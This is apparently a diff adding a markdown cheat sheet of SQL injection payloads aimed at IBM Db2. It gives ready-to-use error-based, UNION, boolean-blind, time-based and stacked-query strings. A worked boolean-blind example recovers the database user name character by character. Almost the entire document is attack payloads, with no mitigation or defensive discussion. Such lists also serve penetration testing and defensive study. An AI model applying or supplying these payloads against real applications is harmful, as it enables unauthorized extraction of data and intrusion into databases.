@@ -1,0 +1,235 @@
+# IBM Db2
+
+## Error-based
+Cast to invalid type to leak data in error.
+
+To retrieve version (service_level):
+' AND 1=CAST(service_level AS INT) --
+
+## Union query-based
+Append UNION to extract.
+
+To retrieve version:
+' UNION SELECT NULL, service_level FROM sysibmadm.env_inst_info --
+
+To retrieve user:
+' UNION SELECT NULL, user FROM sysibm.sysdummy1 --
+
+## Boolean-based blind
+Use direct conditions for true/false inference.
+
+To find length:
+
+LENGTH(user)>16:
+' AND LENGTH(user)>16 --
+
+(False)
+
+>8:
+' AND LENGTH(user)>8 --
+
+(False)
+
+>4:
+' AND LENGTH(user)>4 --
+
+(True)
+
+>6:
+' AND LENGTH(user)>6 --
+
+(False)
+
+>5:
+' AND LENGTH(user)>5 --
+
+(False)
+
+=5:
+' AND LENGTH(user)=5 --
+
+(True)
+
+To extract:
+
+Position 1:
+
+ASCII(SUBSTR(user,1,1))>109:
+' AND ASCII(SUBSTR(user,1,1))>109 --
+
+(False)
+
+>103:
+' AND ASCII(SUBSTR(user,1,1))>103 --
+
+(False)
+
+>100:
+' AND ASCII(SUBSTR(user,1,1))>100 --
+
+(False)
+
+>98:
+' AND ASCII(SUBSTR(user,1,1))>98 --
+
+(False)
+
+>97:
+' AND ASCII(SUBSTR(user,1,1))>97 --
+
+(False)
+
+=97:
+' AND ASCII(SUBSTR(user,1,1))=97 --
+
+(True)
+
+Position 2:
+
+>109:
+' AND ASCII(SUBSTR(user,2,1))>109 --
+
+(False)
+
+>103:
+' AND ASCII(SUBSTR(user,2,1))>103 --
+
+(False)
+
+>100:
+' AND ASCII(SUBSTR(user,2,1))>100 --
+
+(False)
+
+>98:
+' AND ASCII(SUBSTR(user,2,1))>98 --
+
+(True)
+
+>99:
+' AND ASCII(SUBSTR(user,2,1))>99 --
+
+(True)
+
+=100:
+' AND ASCII(SUBSTR(user,2,1))=100 --
+
+(True)
+
+Position 3:
+
+>109:
+' AND ASCII(SUBSTR(user,3,1))>109 --
+
+(False)
+
+>103:
+' AND ASCII(SUBSTR(user,3,1))>103 --
+
+(True)
+
+>106:
+' AND ASCII(SUBSTR(user,3,1))>106 --
+
+(True)
+
+>108:
+' AND ASCII(SUBSTR(user,3,1))>108 --
+
+(True)
+
+>109:
+' AND ASCII(SUBSTR(user,3,1))>109 --
+
+(False)
+
+=109:
+' AND ASCII(SUBSTR(user,3,1))=109 --
+
+(True)
+
+Position 4:
+
+>109:
+' AND ASCII(SUBSTR(user,4,1))>109 --
+
+(False)
+
+>103:
+' AND ASCII(SUBSTR(user,4,1))>103 --
+
+(True)
+
+>106:
+' AND ASCII(SUBSTR(user,4,1))>106 --
+
+(False)
+
+>104:
+' AND ASCII(SUBSTR(user,4,1))>104 --
+
+(True)
+
+>105:
+' AND ASCII(SUBSTR(user,4,1))>105 --
+
+(False)
+
+=105:
+' AND ASCII(SUBSTR(user,4,1))=105 --
+
+(True)
+
+Position 5:
+
+>109:
+' AND ASCII(SUBSTR(user,5,1))>109 --
+
+(True)
+
+>116:
+' AND ASCII(SUBSTR(user,5,1))>116 --
+
+(False)
+
+>113:
+' AND ASCII(SUBSTR(user,5,1))>113 --
+
+(False)
+
+>111:
+' AND ASCII(SUBSTR(user,5,1))>111 --
+
+(False)
+
+>110:
+' AND ASCII(SUBSTR(user,5,1))>110 --
+
+(False)
+
+=110:
+' AND ASCII(SUBSTR(user,5,1))=110 --
+
+(True)
+
+## Time-based blind
+No native sleep; use slow queries like cross joins to delay if true.
+
+Base slow if true:
+' AND (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b WHERE a.colname = b.colname) >0 -- (slow on large tables)
+
+To find length:
+
+CASE WHEN LENGTH(user)>16 THEN (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) ELSE 0 END >0
+' AND CASE WHEN LENGTH(user)>16 THEN (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) ELSE 0 END >0 --
+
+(No delay)
+
+Similarly adapt for other checks, replacing the condition.
+
+For chars, similar adaptation.
+
+## Stacked queries
+If supported:
+'; SELECT user FROM sysibm.sysdummy1 --
+
